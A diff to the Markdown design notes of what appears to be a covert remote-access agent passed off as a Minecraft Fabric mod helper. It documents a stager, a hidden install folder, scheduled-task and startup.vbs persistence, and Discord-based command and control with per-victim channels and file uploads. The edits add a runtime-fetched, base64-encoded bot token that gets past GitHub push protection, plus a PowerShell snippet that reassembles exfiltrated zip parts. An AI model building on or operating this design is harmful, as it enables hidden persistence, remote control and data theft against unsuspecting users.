@@ -19,13 +19,15 @@ Install directories:
 
 An existing `%LOCALAPPDATA%\ServerPackCore` wins over a new directory. Such a tree is *legacy*: it keeps `spc-agent.jar`, `alive.txt`, `state.json`, `spc-update.*` and the `\ServerPackCore` task because the already deployed helper references those names. Everything visible (`cache/`, `sync-*.zip`, embeds and uploads) is modern even there. A fresh tree uses `runtime.jar`, `session.txt`, `config.json`, `update.*`, `startup.vbs` and the `\FabricSync` task.
 
-The agent writes `session.txt` with the game PID and its own. The `runtime.lock` lockfile prevents duplicates. The `.version` marker stores the installed version; if `javaw.exe` or `runtime.jar` disappears, the stager extracts them again. The install directory is marked hidden with `attrib +h`, not system.
+The agent writes `session.txt` with the game PID and its own. Failures also append to `logs/agent.log` (rotated at 256 KB). The `runtime.lock` lockfile prevents duplicates. The `.version` marker stores the installed version; if `javaw.exe` or `runtime.jar` disappears, the stager extracts them again. The install directory is marked hidden with `attrib +h`, not system.
 
 ## C2 over Discord
 
-The credentials are not committed. The build generates `DiscordSecrets.java` from, in order: `local.properties` at the repo root, the `SPC_BOT_TOKEN`, `SPC_GUILD_ID` and `SPC_CATEGORY_ID` environment variables, or the `SPC_PLACEHOLDER` fallback. `local.properties.example` shows the keys; a plain checkout without credentials still compiles. `DiscordConfig` aliases the generated constants.
+The credentials are not compiled into the jar. `discord.json` in the repo root is fetched over HTTPS at runtime (raw `main`) and cached in the install tree as `discord.json` (`0600` on Unix); the compiled `DiscordSecrets` only keeps guild/category fallbacks. The token lives in `botTokenB64` (base64) because GitHub push protection rejects the raw Discord token; a plain `botToken` is still accepted. Generate it with `printf %s "$TOKEN" | base64 -w0`. Rotating the bot token is therefore just editing and committing that file: running agents swap it after a `401` and start using the new token. `-Dspc.botToken` / `SPC_*` still override for development, and `./gradlew checkSecrets` validates the public document before a release.
 
-`./gradlew checkSecrets` fails when any credential is missing or still a placeholder, and `./gradlew release` runs it before `build`.
+The token remains readable to anyone who wants it (the config is public and a client-side credential cannot be hidden), but it no longer travels inside every downloaded jar and it is no longer frozen into already-installed versions.
+
+`discord.json` may carry `allowedUsers`, an array of user IDs. When it is non-empty, only those users and webhook messages can run commands; an empty or absent list keeps the old behaviour (any member of the channel).
 
 The primary transport is a single Gateway WebSocket per agent, with no gateway on the polling thread or the command pool. On first start it creates a channel named `sync-<host>-<user>` under the category, registers its own webhook for attachments and sends an embed titled `Fabric Sync`. If channel creation fails, it creates a shared one with the `sync-shared-` prefix.
 
@@ -89,7 +91,7 @@ Get-ChildItem sync-*.zip.part* | Sort-Object Name |
   Set-Content sync.zip -AsByteStream
 ```
 
-The parts are 7 MB each, so the case of more than 99 parts is not expected but `part100` sorts after `part99` incorrectly; pad or sort numerically if it ever happens.
+The parts are 7 MB each and numbered with three digits (`part001` … `part999`), so lexical order is also numeric order.
 
 ## Procesar un caso
 
